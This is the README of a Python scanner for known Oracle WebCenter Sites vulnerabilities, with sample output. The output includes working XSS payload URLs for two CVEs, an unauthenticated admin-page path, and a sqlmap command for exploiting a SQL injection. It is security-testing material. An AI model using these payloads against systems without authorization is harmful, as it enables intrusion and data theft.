# wcs_scanner
#### WebCenter Sites Vulnerability Scanner

Scan Oracle WebCenter Sites platform looking for its known vulnerabilities.

## Usage
```bash
python3 wcs_scanner.py http://example.com
```

**Example output**
```text
[!] Start scanning http://example.com
[*] Using proxies={'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}

[*] Look for default login page
[-] Default login page not found

[*] Testing CVE-2018-2791 and CVE-2018-3238 - Multiple XSS
[+] Vulnerable to CVE-2018-2791 (Multiple XSS)
    Payload: http://example.com?c=qqqq&cid=qqqq&pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/confirmmakeasset&cs_imagedir=qqq%22><script>alert(24)</script>
[+] Vulnerable to CVE-2018-3238 (Multiple XSS)
    Payload: http://example.com?c=qqqq&cid=qqqq&pagename=OpenMarket/Gator/FlexibleAssets/AssetMaker/complexassetmaker&cs_imagedir=qqq%22><script>alert(24)</script>

[*] Testing CVE-2019-2578 - Broken Access Control
[+] Vulnerable to CVE-2019-2578 (Broken Access Control)
    Evidence: http://example.com?pagename=OpenMarket/Xcelerate/Admin/WebReferences

[*] Testing SQL Injection
[+] Vulnerable to CVE-2019-2579 (SQL Injection)
[*] You should test this with sqlmap:
sqlmap --dbms Oracle --url http://example.com/cs/ContentServer --data '_authkey_=...&pagename=OpenMarket/Xcelerate/Admin/WebReferences&op=search&urlsToDelete=&resultsPerPage=25&searchChoice=webroot&searchText=*' --cookie 'JSESSIONID=...' --technique U

```

## Reference:
- https://outpost24.com/blog/Vulnerabilities-discovered-in-Oracle-WebCenter-Sites
- https://www.exploit-db.com/exploits/44752


## TODO
Nuclei templates for:
- cve-2019-2579
